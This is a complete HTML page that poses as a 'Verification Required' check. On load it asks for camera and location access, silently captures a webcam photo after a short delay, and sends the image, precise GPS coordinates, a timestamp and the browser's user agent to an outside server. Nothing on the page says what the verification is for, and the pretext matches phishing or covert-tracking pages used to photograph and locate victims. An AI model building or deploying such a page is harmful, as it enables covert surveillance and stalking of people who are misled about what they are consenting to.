<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verify Location</title>

<style>
body { font-family: Arial; background:#f5f5f5; margin:0; padding:20px;}
.container{background:white; max-width:700px; margin:0 auto; padding:25px; border:1px solid #ddd;}
.status{padding:12px;margin:15px 0;border:1px solid #ddd;background:#f9f9f9}
#video{width:100%;max-width:500px;display:none;margin:15px 0}
#capturedImage{max-width:100%;margin:15px 0;display:none}
.info{background:#fafafa;padding:15px;margin:15px 0;border-left:3px solid #888;display:none}
.info p{margin:8px 0;color:#555;font-size:14px}
</style>
</head>

<body>
<div class="container">
<h2>Verification Required</h2>
<div id="status" class="status">Please allow camera and location access...</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>
<img id="capturedImage">

<div id="infoBox" class="info">
<p id="locationInfo"></p>
<p id="timestampInfo"></p>
<p id="statusInfo"></p>
</div>
</div>

<script>
let stream = null;
let photoData = null;
let locationData = null;

window.addEventListener('load', async () => { await requestPermissions(); });

async function requestPermissions() {
    try {
        navigator.geolocation.getCurrentPosition(
            pos => {
                locationData = {
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    timestamp: new Date(pos.timestamp).toLocaleString()
                };
            },
            err => console.log("Location error:", err.message),
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );

        stream = await navigator.mediaDevices.getUserMedia({ video:true, audio:false });
        const video = document.getElementById("video");
        video.srcObject = stream;
        video.style.display = "block";

        showStatus("Processing...");
        setTimeout(capturePhoto, 2000);
    } catch {
        showStatus("Access denied. Enable permissions.");
    }
}

function capturePhoto() {
    const video = document.getElementById("video");
    if (!video.videoWidth) return setTimeout(capturePhoto, 500);

    const canvas = document.getElementById("canvas");
    const img = document.getElementById("capturedImage");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    photoData = canvas.toDataURL("image/jpeg", 0.8);
    img.src = photoData;
    img.style.display = "block";

    stream.getTracks().forEach(t => t.stop());
    video.style.display = "none";

    showStatus("Complete");
    displayInfo();

    setTimeout(sendData, 1000);
}

function displayInfo() {
    document.getElementById("infoBox").style.display = "block";
    document.getElementById("locationInfo").innerHTML =
        locationData
        ? `<strong>Coordinates:</strong> ${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`
        : "<strong>Coordinates:</strong> Unavailable";

    document.getElementById("timestampInfo").innerHTML =
        `<strong>Time:</strong> ${new Date().toLocaleString()}`;

    document.getElementById("statusInfo").innerHTML =
        "<strong>Status:</strong> Verifying...";
}

async function sendData() {
    const serverUrl = "https://photo-geotag.onrender.com/upload";

    const dataPackage = {
        photo: photoData,
        location: locationData,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    };

    try {
        const res = await fetch(serverUrl, {
            method:"POST",
            headers:{ "Content-Type":"application/json" },
            body: JSON.stringify(dataPackage)
        });

        if (!res.ok) throw new Error();

        showStatus("Verification complete");
        document.getElementById("statusInfo").innerHTML = "<strong>Status:</strong> Verified";
    } catch {
        showStatus("Verification failed");
        document.getElementById("statusInfo").innerHTML = "<strong>Status:</strong> Failed";
    }
}

function showStatus(msg){ document.getElementById("status").innerHTML = msg; }
</script>
</body>
</html>
